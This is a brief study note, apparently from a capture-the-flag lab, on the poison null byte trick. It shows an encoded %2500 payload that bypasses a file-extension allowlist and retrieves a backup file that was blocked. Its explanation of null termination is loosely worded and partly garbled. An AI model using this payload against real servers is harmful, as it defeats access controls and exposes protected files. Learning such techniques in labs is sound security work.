# Poison Null Byte

Character Bypass = is a NULL Terminator. If NULL gets in a String it will be Terminate by the Server and Rest of the String becomes NULL

Poison Null Byte = `%00` 
Posion Null Byte + URL Encode = `%2500`

Example: 

```
10.10.206.192/ftp/package.json.bak
   => 403 Error: Only .md and .pdf files are allowed!
10.10.206.192/ftp/package.json.bak%2500.md
   => 200 Success
```